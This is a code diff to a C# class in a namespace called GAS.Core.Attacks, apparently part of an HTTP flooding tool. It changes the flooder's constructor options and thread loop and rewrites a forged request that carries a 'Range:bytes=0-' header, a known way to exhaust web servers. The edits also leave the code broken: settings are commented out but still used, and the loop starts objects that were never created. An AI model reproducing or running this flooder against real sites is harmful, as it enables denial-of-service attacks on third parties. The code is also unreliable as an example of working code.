@@ -34,13 +34,10 @@ namespace GAS.Core.Attacks {
             int port = 80,
             string subSite = "/",
             bool resp = true,
-            int delay = 0,
-            int timeout = 5000,
             bool random = true,
             bool usegzip = true,
             int threadcount = 1,
-            int attacktype = 0,
-            int connectionsPerThread = 1 ) {
+            int attacktype = 0) {
 
             this._buffer = new byte[ BUFFER_SIZE ];
             this.ThreadCount = threadcount;
@@ -61,12 +58,12 @@ namespace GAS.Core.Attacks {
             this.Port = port;
             this._subsite = subSite;
             this._resp = resp;
-            this.Delay = delay;
-            this.Timeout = timeout * 1000;
+            //this.Delay = delay;
+            //this.Timeout = timeout * 1000;
             this._random = random;
             this._usegZip = usegzip;
             this.States = new ReqState[ this.ThreadCount ];
-            this._spt = connectionsPerThread;
+            //this._spt = connectionsPerThread;
             this._attacktype = attacktype;
         }
 
@@ -94,7 +91,7 @@ namespace GAS.Core.Attacks {
                 this._ip,
                 this.Port );
             var fs = new AsyncFlooder[ this._spt ];
-            for ( var i = 0; i < this._spt; i++ ) //fs[ i ] = new AsyncFlooder(this);
+            for ( var i = 0; i < this._spt; i++ ) //fs[ info ] = new AsyncFlooder(this);
                 fs[ i ].Start();
             Thread.Sleep( System.Threading.Timeout.Infinite );
         }
@@ -129,10 +126,12 @@ namespace GAS.Core.Attacks {
                 String.Format(
                     String.Concat(
                         new[] {
-                            "HEAD {0}{1} HTTP/1.1{4}",
+                            "GET {0}{1} HTTP/1.1{4}",
+                            "Host: {2}{4}",
                             "Accept: */*{4}",
                             "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}",
-                            "{3}Host: {2}{4}" + "Range:bytes=0-{5}{4}",
+                            "{3}",
+                            "Range:bytes=0-{5}{4}",
                             "Connection: close{4}",
                             "{4}"
                         } ),
